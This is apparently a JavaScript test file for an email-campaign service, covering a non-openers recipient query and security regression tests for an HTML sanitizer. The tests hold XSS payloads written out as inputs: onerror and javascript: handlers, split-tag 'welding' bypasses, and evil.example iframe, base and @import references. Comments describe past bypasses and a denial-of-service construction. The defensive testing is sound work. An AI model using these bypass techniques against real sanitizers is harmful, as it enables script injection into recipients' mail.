    const db = {
      from(table) {
        const state = { table, ops: [] }
        statements.push(state)
        const b = new Proxy({}, {
          get(_, method) {
            if (method === 'then') {
              const p = Promise.resolve(route(state) ?? {})
              return p.then.bind(p)
            }
            return (...args) => { state.ops.push({ method, args }); return b }
          },
        })
        return b
      },
    }
    return { db, statements }
  }

  const hasEq = (state, col, val) => state.ops.some((o) => o.method === 'eq' && o.args[0] === col && o.args[1] === val)

  function routeFor({ parent = { id: PARENT } } = {}) {
    return (state) => {
      if (state.table === 'host_campaigns') return { data: parent, error: null }
      if (state.table === 'host_email_suppressions') return { data: [], error: null }
      if (state.table === 'host_contacts') return { data: HOST_CONTACTS, error: null }
      if (state.table === 'host_campaign_sends') return { data: applySendsOps(SEND_ROWS, state.ops), error: null }
      return {}
    }
  }

  it('only the parent\'s delivered, unopened, unclicked, unbounced rows, then the normal emailability gate', async () => {
    const { db, statements } = makeDb(routeFor())
    const out = await resolveHostRecipients(db, HOST_ID, { nonOpenersOf: PARENT })
    // The data assertion carries the weight: c2 (opened), c3 (bounced), c6
    // (never delivered), c7 (complained) and c8 (unsubscribed) are excluded
    // by the sends-history filter; c5 passes that filter but is excluded
    // ONLY by host_contacts.marketing_consent === false — deleting the
    // resolver's isEmailable() call would let c5 through and turn this
    // assertion red.
    expect(out.map((r) => r.contact_id)).toEqual(['c1'])

    const sendsQuery = statements.find((s) => s.table === 'host_campaign_sends')
    expect(hasEq(sendsQuery, 'campaign_id', PARENT)).toBe(true)
    expect(hasEq(sendsQuery, 'status', 'sent')).toBe(true)
    for (const col of ['opened_at', 'clicked_at', 'bounced_at', 'complained_at', 'unsubscribed_at']) {
      expect(sendsQuery.ops.some((o) => o.method === 'is' && o.args[0] === col && o.args[1] === null)).toBe(true)
    }
    // Full args, not just the column: `.not('delivered_at', 'is', null)`.
    expect(sendsQuery.ops.some((o) => o.method === 'not' && o.args[0] === 'delivered_at' && o.args[1] === 'is' && o.args[2] === null)).toBe(true)

    const parentRead = statements.find((s) => s.table === 'host_campaigns')
    expect(hasEq(parentRead, 'id', PARENT)).toBe(true)
    expect(hasEq(parentRead, 'host_id', HOST_ID)).toBe(true)
  })

  it('a parent that is not this host\'s throws (no cross-host audience)', async () => {
    const { db } = makeDb(routeFor({ parent: null }))
    await expect(resolveHostRecipients(db, HOST_ID, { nonOpenersOf: PARENT })).rejects.toThrow(/parent campaign/)
  })

  it('an empty non-openers set short-circuits — [] with no host_contacts or host_email_suppressions statements', async () => {
    const { db, statements } = makeDb((state) => {
      if (state.table === 'host_campaigns') return { data: { id: PARENT }, error: null }
      if (state.table === 'host_campaign_sends') return { data: [], error: null }
      return {}
    })
    const out = await resolveHostRecipients(db, HOST_ID, { nonOpenersOf: PARENT })
    expect(out).toEqual([])
    expect(statements.some((s) => s.table === 'host_contacts')).toBe(false)
    expect(statements.some((s) => s.table === 'host_email_suppressions')).toBe(false)
  })

  it('paginates the non-openers read past 1000 rows', async () => {
    // 1005 qualifying rows: page one is s0..s999 (range 0-999), page two is
    // s1000..s1004 (range 1000-1999, only 5 rows). host_contacts is kept
    // deliberately tiny — only the two contacts this test cares about.
    const TOTAL = 1005
    const sendsRows = Array.from({ length: TOTAL }, (_, i) => ({ contact_id: `s${i}` }))
    const hostContacts = ['s0', 's1000'].map((id) => ({
      contact_id: id,
      marketing_consent: true,
      contact: { id, email: `${id}@x.ie`, email_marketing: true, email_status: 'active', email_suppressed_at: null },
    }))
    const { db, statements } = makeDb((state) => {
      if (state.table === 'host_campaigns') return { data: { id: PARENT }, error: null }
      if (state.table === 'host_email_suppressions') return { data: [], error: null }
      if (state.table === 'host_contacts') return { data: hostContacts, error: null }
      if (state.table === 'host_campaign_sends') {
        const [from, to] = state.ops.find((o) => o.method === 'range').args
        return { data: sendsRows.slice(from, to + 1), error: null }
      }
      return {}
    })
    const out = await resolveHostRecipients(db, HOST_ID, { nonOpenersOf: PARENT })
    const sendsQueries = statements.filter((s) => s.table === 'host_campaign_sends')
    expect(sendsQueries.map((s) => s.ops.find((o) => o.method === 'range').args)).toEqual([[0, 999], [1000, 1999]])
    expect(out.map((r) => r.contact_id)).toContain('s1000') // from page two
  })
})

// HOST-EMAILS.2 — <style> survives (scrubbed), the viewport meta survives
// (canonicalised), everything else on the strip list still goes. A Canva or
// Unlayer export keeps its whole responsive layer in a <style> block; before
// this it rendered as a fixed 600px table on phones.
describe('sanitizeCampaignHtml — styles and viewport (HOST-EMAILS.2)', () => {
  const CANVA = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="x-apple-disable-message-reformatting"><style>@import url("https://evil.example/x.css"); .wrap{min-width:600px} @media (max-width:600px){ .wrap{min-width:0 !important;width:100% !important} }</style></head><body><table class="wrap"><tr><td>Hi</td></tr></table></body></html>'

  it('keeps the <style> block with its media query and drops the @import', () => {
    const out = sanitizeCampaignHtml(CANVA)
    expect(out).toContain('<style>')
    expect(out).toContain('@media (max-width:600px)')
    expect(out).toContain('width:100% !important')
    expect(out).not.toContain('@import')
    expect(out).not.toContain('evil.example')
  })

  it('keeps exactly one canonical viewport meta and strips the other metas', () => {
    const out = sanitizeCampaignHtml(CANVA)
    expect(out.match(/<meta/g)).toHaveLength(1)
    expect(out).toContain('<meta name="viewport" content="width=device-width, initial-scale=1">')
    expect(out).not.toContain('x-apple-disable-message-reformatting')
    expect(out).not.toContain('charset')
  })

  it('never lets an authored viewport meta carry extra attributes through', () => {
    const out = sanitizeCampaignHtml('<meta name="viewport" content="width=device-width" onload="x()" http-equiv="refresh"><p>x</p>')
    expect(out).toContain('<meta name="viewport" content="width=device-width, initial-scale=1">')
    expect(out).not.toContain('refresh')
    expect(out).not.toContain('onload')
  })

  it('a <style> that tries to close itself early cannot smuggle a tag', () => {
    const out = sanitizeCampaignHtml('<style>.a{}</style ><script>alert(1)</script><style>.b{color:red}</st\\yle><img src=x onerror=alert(1)></style>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('onerror')
    expect(out).not.toMatch(/<style>[^<]*<img/)
  })

  it('still strips script, iframe, form, link, svg and on* handlers', () => {
    const out = sanitizeCampaignHtml('<style>.a{}</style><link rel="stylesheet" href="https://x/y.css"><script>1</script><iframe src="x"></iframe><form action="x"><input></form><svg onload="1"></svg><a href="https://ok" onclick="1">ok</a>')
    expect(out).toContain('<style>.a{}</style>')
    expect(out).not.toContain('<link')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('<iframe')
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<svg')
    expect(out).not.toContain('onclick')
    // The space the removed on* handler left behind is KEPT now: the `\s+>`
    // collapse that used to tidy it also rewrote `.a > .b` inside restored
    // <style> bodies into a descendant selector (security review).
    expect(out).toMatch(/<a href="https:\/\/ok"\s*>ok<\/a>/)
  })

  it('a forged placeholder in the input cannot inject a style block', () => {
    const out = sanitizeCampaignHtml('<p>@@UN1T_STYLE_0@@ @@UN1T_VIEWPORT@@</p><style>.z{}</style>')
    expect(out).not.toContain('@@UN1T_')
    expect((out.match(/<style>/g) || []).length).toBe(1)
    expect(out).not.toContain('<meta')
  })

  it('renderHostCampaignHtml keeps a full-document export responsive', () => {
    const html = renderHostCampaignHtml({ host: { name: 'Club', sender_name: 'Club' }, subject: 's', bodyHtml: CANVA, unsubscribeUrl: 'https://x/u' })
    expect(html).toContain('@media (max-width:600px)')
    expect(html).toContain('name="viewport"')
    expect(html).toContain('https://x/u')
  })
})

// ---------------------------------------------------------------------------
// Security review fixes — pins the two real defects found in the
// just-landed HOST-EMAILS.2 sanitizer:
//   1. dropOnAttrBoundary dropped a WHITESPACE boundary, which is
//      structural when the removed on* attribute abuts the next token
//      (no space between them) — merging attribute names/values together
//      and, worst case, hiding a `href` from the URL scheme check.
//   2. the placeholder scheme was forgeable via a nested prefix
//      (`@@UN1T@@UN1T__STYLE_0@@` reconstitutes after ONE `.split().join()`
//      pass), letting a host duplicate/relocate style content or the
//      viewport meta, or inject `<style>` text inside an open tag.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — on* boundary + placeholder-forgery regressions (security review)', () => {
  it('an on* attribute directly abutting the NEXT attribute (no whitespace) does not eat it', () => {
    // Was: dropOnAttrBoundary swallowed the whitespace boundary, merging
    // `<a onclick="1"href="...">` into `<ahref="...">` — the href attribute
    // vanished as such, so URL_ATTR's scheme check never saw it and the
    // javascript: URL survived verbatim.
    const out = sanitizeCampaignHtml('<a onclick="1"href="javascript:alert(1)">click</a>')
    expect(out).not.toMatch(/onclick/i)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).toContain('<a href="#">click</a>')
  })

  it('an on* attribute directly abutting a following src (no whitespace) keeps the image', () => {
    // Was: <imgsrc=…> — the image silently lost its src attribute entirely.
    const out = sanitizeCampaignHtml('<img onclick="track()"src="https://cdn/hero.png" alt="Hero">')
    expect(out).not.toMatch(/onclick/i)
    expect(out).toContain('src="https://cdn/hero.png"')
    expect(out).toContain('alt="Hero"')
  })

  it('two adjacent on* attributes (quoted then bare, no space between) both go cleanly', () => {
    // Was: <img src=xonerror=alert(1)> — dropOnAttrBoundary ate the space
    // ahead of the bare attribute too, splicing "x" and "onerror" together.
    const out = sanitizeCampaignHtml('<img src=x onclick="1"onerror=alert(1)>')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('onclick')
    expect(out).toContain('<img src=x')
  })

  it('a nested-prefix forgery around a style placeholder token cannot duplicate the style block', () => {
    // @@UN1T@@UN1T__STYLE_0@@ reconstitutes into a live "@@UN1T_STYLE_0@@"
    // token after exactly one split/join pass — the fixed-point strip (and
    // the per-call nonce) must reduce it to inert text instead.
    const out = sanitizeCampaignHtml('<style>.real{color:red}</style><p>@@UN1T@@UN1T__STYLE_0@@</p>')
    expect((out.match(/<style>/g) || []).length).toBe(1)
    expect(out).not.toContain('@@UN1T_')
  })

  it('a nested-prefix forgery around a viewport placeholder token cannot relocate the viewport meta into the body', () => {
    const out = sanitizeCampaignHtml('<p>@@UN1T@@UN1T__VIEWPORT@@</p><meta name="viewport" content="x">')
    expect(out).not.toContain('@@UN1T_')
    expect(out).toContain('<meta name="viewport" content="width=device-width, initial-scale=1">')
    // the canonical meta must land OUTSIDE the <p>, not be spliced into it
    expect(out).not.toMatch(/<p>[^]*?<meta[^]*?<\/p>/)
    expect(out.indexOf('<meta')).toBeGreaterThan(out.indexOf('</p>'))
  })

  it('a triple-nested prefix forgery is still reduced to a fixed point with no live token left', () => {
    const out = sanitizeCampaignHtml('@@UN1T@@UN1T@@UN1T___STYLE_0@@')
    expect(out).not.toContain('@@UN1T_')
  })

  it('a forged placeholder token sitting inside an open tag cannot resurrect a <style> tag there', () => {
    const out = sanitizeCampaignHtml('<a href="https://ok" @@UN1T@@UN1T__STYLE_0@@>hi</a><style>.a{}</style>')
    expect(out).not.toContain('@@UN1T_')
    expect(out).not.toMatch(/<a[^>]*<style/)
  })

  it('two separate sanitizeCampaignHtml calls use independent (non-colliding) placeholder nonces', () => {
    // Not a shared/global token — two renders can run concurrently without
    // one call's forged input ever matching another call's live placeholder.
    const a = sanitizeCampaignHtml('<style>.a{color:red}</style><p>hi</p>')
    const b = sanitizeCampaignHtml('<style>.b{color:blue}</style><p>bye</p>')
    expect(a).toContain('<style>.a{color:red}</style>')
    expect(b).toContain('<style>.b{color:blue}</style>')
  })
})

// ---------------------------------------------------------------------------
// Security re-review — the COMPLETE SANITIZER BYPASS in the just-landed
// HOST-EMAILS.2 sanitizer, plus the three smaller holes found beside it.
//
// Root cause of the bypass: step 2 replaced EVERY `<meta name=viewport>` with
// a placeholder, and the restore step then deleted every placeholder but the
// first — a DELETION PERFORMED AFTER the fixed-point strip loop. It spliced
// the surrounding text together and nothing ever re-scanned the result, so a
// host could saw any dangerous construct in half with `<meta name=viewport>`
// and have the sanitizer weld it back together on the way out. Every one of
// the four payloads below shipped LIVE active content.
//
// The fix is structural: only the FIRST viewport meta becomes a placeholder;
// every other one is left exactly as authored so TAG_STRIP removes it INSIDE
// the loop, where the splice is re-scanned. Nothing is ever deleted after the
// loop — the two restorations only insert a scrubbed <style> body or the
// fixed canonical meta tag.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — viewport-meta splice bypass (security re-review)', () => {
  // COUNTED IN THE PARSED DOCUMENT, not in the string. With whole-tag
  // scanning `<scr<meta name=viewport>` is ONE element named `scr<meta` whose
  // second attribute happens to be spelled `viewport` — the text `<meta`
  // appears twice more in the source and neither is an element. Counting
  // substrings answered the wrong question.
  const oneMeta = (out) => expect(parsedElements(out).filter((t) => t === 'meta')).toHaveLength(1)

  it('cannot weld a live <script> back together through split viewport metas', () => {
    // ROUND 6 CHANGED WHAT THIS PAYLOAD IS. A `<` inside a tag is an ordinary
    // character, so `<scr<meta name=viewport>` is ONE element named `scr<meta`
    // — there is nothing to weld any more, and `window.__pwned=1` is visible
    // text. The assertion that survives is the one that always mattered: no
    // <script> element, one meta, and a live unsubscribe link on both paths.
    const body = '<meta name=viewport><scr<meta name=viewport>ipt>window.__pwned=1</scr<meta name=viewport>ipt>'
    const out = sanitizeCampaignHtml(body)
    expect(parsedElements(out)).not.toContain('script')
    oneMeta(out)
    expectSafeBothPaths(body)
  })

  it('cannot weld a live onerror= handler back together through a split viewport meta', () => {
    // The `on<meta` here is now an ATTRIBUTE NAME on the <img>, and it is
    // deleted for starting with `on` — which is the round-6 rule that also
    // kills `on<p` and a valueless `onerror`. `error=alert(1)>` is text.
    const body = '<meta name=viewport><img src=x on<meta name=viewport>error=alert(1)>'
    const out = sanitizeCampaignHtml(body)
    expect(handlerAttrs(out)).toEqual([])
    oneMeta(out)
    expectSafeBothPaths(body)
  })

  it('cannot weld a javascript: href back together through a split viewport meta', () => {
    // The `<meta …>` is inside a QUOTED value, so it is part of the href and
    // not a tag at all. `java<meta name=viewport>script:alert(1)` has no
    // scheme (a scheme cannot contain `<`), which makes it a relative URL — a
    // browser navigates to a 404, not to script. Asserted on the PARSED href.
    const body = '<meta name=viewport><a href="java<meta name=viewport>script:alert(1)">x</a>'
    const out = sanitizeCampaignHtml(body)
    expect(out).not.toMatch(/javascript:/i)
    expect(badSchemeAttrs(out)).toEqual([])
    oneMeta(out)
    expectSafeBothPaths(body)
  })

  it('cannot weld an <iframe> back together through split viewport metas', () => {
    // One element named `ifra<meta`, which is not an iframe and frames nothing.
    const body = '<meta name=viewport><ifra<meta name=viewport>me src="https://evil"></ifra<meta name=viewport>me>'
    const out = sanitizeCampaignHtml(body)
    expect(parsedElements(out)).not.toContain('iframe')
    oneMeta(out)
    expectSafeBothPaths(body)
  })

  it('still keeps exactly one canonical viewport meta when several are authored', () => {
    const out = sanitizeCampaignHtml(
      '<meta name="viewport" content="a"><p>x</p><meta name="viewport" content="b">'
    )
    oneMeta(out)
    expect(out).toContain('<meta name="viewport" content="width=device-width, initial-scale=1">')
    expect(out).not.toContain('content="a"')
    expect(out).not.toContain('content="b"')
  })

  it('a <style> written inside an open tag is an ATTRIBUTE NAME, and no style element is created', () => {
    // Round 5 read this as a partial `<a` plus a real <style> element, lifted
    // the stylesheet out and then had to refuse to restore it into the
    // attribute list. Round 6 reads what a browser reads: `<style` is the
    // second attribute name of the anchor, the tag ends at the first `>`, and
    // `onerror=alert(1)` is TEXT. Nothing is lifted, so nothing can be
    // restored in the wrong place.
    const body = '<a href="https://ok" <style>onerror=alert(1)</style>>hi</a>'
    const out = sanitizeCampaignHtml(body)
    expect(parsedElements(out)).not.toContain('style')
    expect(handlerAttrs(out)).toEqual([])
    expect(out).toContain('hi')
    expectSafeBothPaths(body)
  })

  it('strips <base>, which would re-point every relative URL in the message', () => {
    const out = sanitizeCampaignHtml('<base href="//evil/"><a href="/offer">o</a>')
    expect(out).not.toMatch(/<base\b/i)
    expect(out).not.toContain('evil')
    expect(out).toContain('href="/offer"')
  })

  it('scheme-checks poster / formaction / background like href and src', () => {
    expect(sanitizeCampaignHtml('<video poster="javascript:alert(1)"></video>')).not.toMatch(/javascript:/i)
    expect(sanitizeCampaignHtml('<video poster="javascript:alert(1)"></video>')).toContain('poster="#"')
    expect(sanitizeCampaignHtml('<button formaction="javascript:alert(1)">go</button>')).toContain('formaction="#"')
    expect(sanitizeCampaignHtml('<td background="data:text/html,x">c</td>')).toContain('background="#"')
    // a legitimate http(s) value is untouched
    expect(sanitizeCampaignHtml('<video poster="https://cdn/p.png"></video>')).toContain('poster="https://cdn/p.png"')
  })

  it('scrubs the inline style attribute (a remote url() is a tracking pixel)', () => {
    const out = sanitizeCampaignHtml('<td style="background:url(https://tracker/x.gif)">hi</td>')
    expect(out).not.toMatch(/url\(\s*['"]?https:\/\/tracker/i)
    expect(out).toContain('hi')
    // parked behind the CRM's unresolvable scheme (or dropped) — never live
    if (/tracker/.test(out)) expect(out).toContain('x-un1t-blocked:https://tracker/x.gif')
  })

  it('scrubs a single-quoted inline style and cannot break out of the attribute', () => {
    const out = sanitizeCampaignHtml("<p style='background:url(\"https://tracker/y.gif\")'>hi</p>")
    expect(out).not.toMatch(/url\(\s*['"]?https:\/\/tracker/i)
    expect(out).not.toMatch(/<p[^>]*>[^<]*"/)
    expect(out).toContain('hi')
  })

  it('keeps a harmless inline style', () => {
    expect(sanitizeCampaignHtml('<p style="color:red">hi</p>')).toContain('style="color:red"')
  })

  it('the `\\s+>` collapse is gone: text nodes and attribute values keep their spacing', () => {
    // It ran over the WHOLE finished document, so every ` >` in ordinary copy
    // or in an attribute was rewritten. `5 > 3` became `5> 3`.
    expect(sanitizeCampaignHtml('<p>book if 5 > 3</p>')).toBe('<p>book if 5 > 3</p>')
    expect(sanitizeCampaignHtml('<a href="https://ok" title="a > b">x</a>'))
      .toBe('<a href="https://ok" title="a > b">x</a>')
  })

  it('a CSS child combinator loses its `>` to scrubCss, NOT to this sanitizer', () => {
    // Pinned so the loss is not re-attributed to the deleted `\s+>` collapse:
    // scrubCss (email-html.js) ends with `.replace(/[<>]/g, '')`, which is the
    // guarantee that a <style> body can never reconstitute a tag. `.a > .b`
    // therefore arrives as a DESCENDANT selector — a real (pre-existing,
    // out-of-scope) fidelity loss for Canva/Unlayer exports, not a security
    // one. Whitespace either side is preserved now, which is all this change
    // can do about it.
    expect(sanitizeCampaignHtml('<style>.a > .b{color:red}</style><p>x</p>'))
      .toBe('<style>.a  .b{color:red}</style><p>x</p>')
  })
})

// ---------------------------------------------------------------------------
// THIRD security review — the same defect class, third instance.
//
// The stranded-placeholder drop was written as
// `insideOpenTag(whole, offset) ? '' : <restore>` INSIDE the restore step,
// i.e. a DELETION PERFORMED AFTER the last strip pass, whose splice nothing
// ever re-scanned. That is exactly the shape of the viewport-meta bypass the
// previous review fixed, and it shipped the same live payloads — this time
// with no decoy meta needed, because the host's own `<style>` element is the
// saw:
//
//   <img src=x on<style>a{color:red}</style>error=alert(1)>  → live onerror
//   <scr<style>…</style>ipt>alert(1)                          → live <script>
//   <a href="javascri<style>…</style>pt:alert(1)">            → javascript:
//   <ifra<style>…</style>me src="https://evil.example/">      → live <iframe>
//   <ba<style>…</style>se href="//evil.example/">             → live <base>
//   <p>Sale!</p><sty<style>…</style>le>                       → unclosed
//     <style> that swallows the server-injected footer
//
// The earlier splice tests all missed it because every one of them opened
// with a decoy `<meta name=viewport>`, which absorbed the single viewport
// placeholder and left the injected device to be stripped normally. THE
// PAYLOADS BELOW CARRY NO DECOY.
//
// The fix is structural, and the invariant is now stated on
// sanitizeCampaignHtml: every deletion (the strip passes AND the stranded-
// placeholder drop) happens inside ONE outer fixed point that re-scans, and
// restoration only ever INSERTS, at positions the final round proved lie
// outside any open tag.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third security review)', () => {
  // Two devices, one payload table. Either element gets lifted out of the
  // document before the strip passes run, so either can saw a construct in
  // half; the <style> one needs no meta at all.
  const DEVICES = {
    style: '<style>a{color:red}</style>',
    viewport: '<meta name="viewport" content="w">',
  }

  // Balance is asserted on the PARSED document now: every <style> the output
  // contains has to be an element parse5 opens AND closes, which is a stronger
  // statement than counting `<style` substrings — and a substring count reads
  // `<sty<style>` (one element named `sty<style`) as an unclosed stylesheet.
  const noUnclosedStyle = (out) => {
    const html = `${out}<span id="footer-would-go-here">FOOTER</span>`
    const problems = []
    const walk = (node, stack) => {
      if (node.tag === 'span' && stack.some((t) => INERT_ANCESTORS.has(t))) problems.push(stack.join('>'))
      for (const c of node.children || []) walk(c, node.tag ? [...stack, node.tag] : stack)
    }
    walk(parse5Tree(html), [])
    expect(problems).toEqual([])
  }

  const PAYLOADS = [
    {
      name: 'an on* handler sawn in half',
      html: (d) => `<img src=x on${d}error=alert(1)>`,
      check: (out) => {
        expect(handlerAttrs(out)).toEqual([])
        expect(out).not.toMatch(/onerror/i)
      },
    },
    {
      name: 'a <script> open tag sawn in half',
      html: (d) => `<scr${d}ipt>alert(1)`,
      check: (out) => {
        expect(out).not.toContain('<script')
        expect(parsedElements(out)).not.toContain('script')
      },
    },
    {
      name: 'a javascript: href sawn in half',
      html: (d) => `<a href="javascri${d}pt:alert(1)">x</a>`,
      check: (out) => {
        expect(out).not.toMatch(/javascript:/i)
        expect(badSchemeAttrs(out)).toEqual([])
      },
    },
    {
      name: 'an <iframe> sawn in half',
      html: (d) => `<ifra${d}me src="https://evil.example/">`,
      check: (out) => {
        expect(out).not.toMatch(/<\/?iframe/i)
        expect(parsedElements(out)).not.toContain('iframe')
      },
    },
    {
      name: 'a <base> sawn in half',
      html: (d) => `<ba${d}se href="//evil.example/">`,
      check: (out) => {
        expect(out).not.toMatch(/<base\b/i)
        expect(parsedElements(out)).not.toContain('base')
      },
    },
    {
      name: 'an unclosed <style> sawn in half (would swallow the injected footer)',
      html: (d) => `<p>Sale!</p><sty${d}le>`,
      check: (out) => {
        expect(out).toContain('<p>Sale!</p>')
        // The footer is appended AFTER this sanitizer runs, so anything the
        // output leaves open swallows it. Asked of a parser, with a stand-in
        // footer appended: nothing may end up inside a raw-text element.
        noUnclosedStyle(out)
      },
    },
  ]

  for (const [deviceName, device] of Object.entries(DEVICES)) {
    for (const payload of PAYLOADS) {
      it(`${payload.name} — spliced with a ${deviceName} placeholder, NO decoy meta`, () => {
        const body = payload.html(device)
        payload.check(sanitizeCampaignHtml(body))
        // …and the whole parsed invariant, on both render paths: whatever the
        // splice produced, it is not a live handler, not a banned element, and
        // it has not cost the message its unsubscribe link.
        expectSafeBothPaths(body)
      })
    }
  }

  it('the same payloads never reassemble when the footer is appended after them', () => {
    // renderHostCampaignHtml injects the footer AFTER sanitization; the
    // unclosed-<style> payload is the one that could hide it. Asserted with a
    // parser, because "the source contains the word Unsubscribe" is precisely
    // the assertion that cannot see a swallowed footer.
    expectSafeBothPaths('<p>Sale!</p><sty<style>a{color:red}</style>le>', { jsdom: true })
  })
})

describe('sanitizeCampaignHtml — quote-aware open-tag scan (third security review)', () => {
  it('a bare `<` in ordinary copy does NOT strand a legitimate <style> block', () => {
    // FALSE POSITIVE in the old `lastIndexOf('<') > lastIndexOf('>')` test:
    // `5 < 6` looked like an unclosed tag, so the placeholder after it read as
    // stranded and the whole (perfectly legitimate) style block was silently
    // deleted from the email. HTML opens a tag only on `<` + letter/`/`/`!`/`?`.
    const out = sanitizeCampaignHtml('5 < 6 and <style>a{color:red}</style> here')
    expect(out).toBe('5 < 6 and <style>a{color:red}</style> here')
  })

  it('a `>` inside a quoted attribute value does NOT close the tag — no <style> element is created inside it', () => {
    // FALSE NEGATIVE in the old test: the `>` in title="a>b" moved
    // lastIndexOf('>') past the `<`, so a placeholder genuinely inside the tag
    // read as outside it and a real <style> element was restored into the
    // attribute list. The `<style>` here is inside a QUOTED VALUE, so it is
    // never an element at all — the style attribute's own scrub takes the
    // angle brackets out of the CSS (scrubCss ends with a `[<>]` strip) and
    // what is left is an invalid declaration, not markup.
    const out = sanitizeCampaignHtml('<img title="a>b" style="<style>a{color:red}</style>">')
    expect(parsedElements(out)).not.toContain('style')
    expect(out).not.toContain('<style')
    expect(out).toContain('title="a>b"')
  })

  it('a <style> block inside an HTML comment is dropped, not restored', () => {
    const out = sanitizeCampaignHtml('<!-- draft <style>a{color:red}</style> --><p>x</p>')
    expect(out).not.toContain('<style')
    expect(out).toContain('<p>x</p>')
  })
})

describe('sanitizeCampaignHtml — footer-swallowing tags (third security review)', () => {
  it('strips <plaintext>, which can never be closed and would eat the footer', () => {
    const out = sanitizeCampaignHtml('<p>x</p><plaintext>hidden footer')
    expect(out).not.toMatch(/<plaintext/i)
    expect(out).toContain('<p>x</p>')
    expect(out).toContain('hidden footer') // the TAG goes, its text stays
  })

  it('strips <textarea>, <noscript>, <noembed>, <xmp> and <template> the same way', () => {
    const out = sanitizeCampaignHtml(
      '<textarea>a</textarea><noscript>b</noscript><noembed>c</noembed><xmp>d</xmp><template>e</template>'
    )
    expect(out).not.toMatch(/<\/?(textarea|noscript|noembed|xmp|template)\b/i)
    expect(out).toBe('abcde')
  })
})

describe('sanitizeCampaignHtml — inline-style CSS budget is per pass, not per document', () => {
  it('a 2,000-cell table keeps every inline style', () => {
    // REGRESSION for counter amplification. The budget (CSS_TOTAL_MAX_CHARS,
    // 250,000) used to be a single per-document counter shared by every
    // fixed-point pass, so the passes multiplied against it: this document
    // spends 88,000 characters per scan, and three scans would exhaust the
    // budget and make scrubCss start returning '' — silently wiping every
    // inline style in an entirely legitimate marketing email. It is now reset
    // at the top of each pass, because the bound is meant to size ONE linear
    // scan of the document.
    const CELL = 'color:#ff0000;padding:4px 8px;font-size:14px'
    const html = `<table>${Array.from({ length: 2000 }, (_, i) => `<tr><td style="${CELL}">c${i}</td></tr>`).join('')}</table>`
    const out = sanitizeCampaignHtml(html)
    expect((out.match(/style="color:#ff0000;padding:4px 8px;font-size:14px"/g) || [])).toHaveLength(2000)
    expect(out).toContain('c1999')
  })
})

describe('sanitizeCampaignHtml — the outer fixed point fails CLOSED', () => {
  // A WELD CHAIN that costs one strip pass per link, which is the shape that
  // survives round 6. `'<'.repeat(n) + 'link>'.repeat(n)`: only the LAST `<`
  // is followed by a letter, so exactly one `<link>` is a tag; deleting it
  // hands the `<` before it a fresh `link>` and the next pass deletes that
  // one, n times over. (The round-5 chain sawed a `<link>` in half with a
  // <style> element — `<lin<style>a{}</style>k>` — and that is no longer a
  // chain at all: a `<` inside a tag is an ordinary character, so the whole
  // thing is ONE element named `lin<style` and nothing welds.)
  //
  // The bound is MAX_INNER_PASSES x MAX_OUTER_PASSES: ten linear passes per
  // round, twenty rounds, and a round that still changed something is a round
  // whose splice has not been re-scanned.
  const chain = (n) => '<'.repeat(n) + 'link>'.repeat(n)

  it('a chain that converges inside the bound sanitizes normally and keeps the rest of the body', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      const out = sanitizeCampaignHtml(`${chain(5)}<p>keep me</p>`)
      expect(out).toBe('<p>keep me</p>')
      expect(warn).not.toHaveBeenCalled()
    } finally {
      warn.mockRestore()
    }
  })

  it('a chain that does NOT converge returns the empty string and warns', () => {
    // Fail closed, loudly: an unconverged document is by definition one whose
    // last deletion was never re-scanned, which is precisely the state all
    // three bypasses shipped from. The legitimate `<p>keep me</p>` is dropped
    // too — that is the trade, and an empty campaign body is something an
    // operator sees and reports.
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      const out = sanitizeCampaignHtml(`${chain(400)}<p>keep me</p>`)
      expect(out).toBe('')
      expect(warn).toHaveBeenCalledTimes(1)
      expect(String(warn.mock.calls[0][0])).toMatch(/failed closed/)
    } finally {
      warn.mockRestore()
    }
  })
})

// ---------------------------------------------------------------------------
// FOURTH security review (round 4). Four findings, all verified against a real
// HTML parser rather than a regex, which is why the earlier rounds missed
// them:
//
//   1. DoS — the literal-prefix strip was a `while (includes) split/join`
//      fixed point. `'@@UN1T'.repeat(k) + '@@UN1T_' + '_'.repeat(k)` deletes
//      one prefix per pass and welds the next one together, so k passes each
//      re-copy the document: 13 SECONDS of server CPU at the API's
//      300,000-char body cap, for one render, from one request.
//   2. `<title>` and `<noframes>` were missing from TAG_STRIP. Both are
//      raw-text/RCDATA elements in the BODY as well, so one unclosed
//      `<title>` at the end of a host body swallowed the injected footer —
//      the `<plaintext>` class, two tags short.
//   3. An unterminated `<!--` did the same thing, and NO tag rule could ever
//      catch it, because it is not a tag.
//   4. The quote scan flipped state on ANY quote inside a tag, not only one
//      opening an attribute value after `=`, so a stray quote desynchronised
//      it from the real tokenizer and a placeholder still inside an open tag
//      scanned as ordinary text.
//
// And one FIDELITY finding, the reverse direction: Outlook conditional
// comments were being treated as ordinary comments, so the `<style>` block
// every Unlayer/Canva export puts inside `<!--[if mso]>…<![endif]-->` was
// silently deleted from the email.
// ---------------------------------------------------------------------------

describe('sanitizeCampaignHtml — the literal-prefix strip is LINEAR (round-4 DoS)', () => {
  it('sanitizes the 280 KB nested-prefix construction in well under 200ms', () => {
    // k=40000 → '@@UN1T' x k + '@@UN1T_' + '_' x k. Under the old
    // `while (out.includes(PREFIX)) out = out.split(PREFIX).join('')` this is
    // k passes over a 280 KB string (~13s measured at the 300,000-char cap).
    // The stack formulation reaches the same fixed point in one pass.
    const k = 40000
    const payload = '@@UN1T'.repeat(k) + '@@UN1T_' + '_'.repeat(k)
    expect(payload.length).toBeGreaterThan(280_000)
    const started = Date.now()
    const out = sanitizeCampaignHtml(payload)
    const elapsed = Date.now() - started
    expect(elapsed).toBeLessThan(200)
    // Still a true fixed point: no live token, and no literal prefix either.
    expect(out).not.toContain('@@UN1T_')
  })

  it('is still a FIXED POINT, so a nested forgery cannot reconstitute a prefix', () => {
    // The linear pass must not be weaker than the loop it replaced: these are
    // the round-3 forgeries, re-asserted against the new implementation.
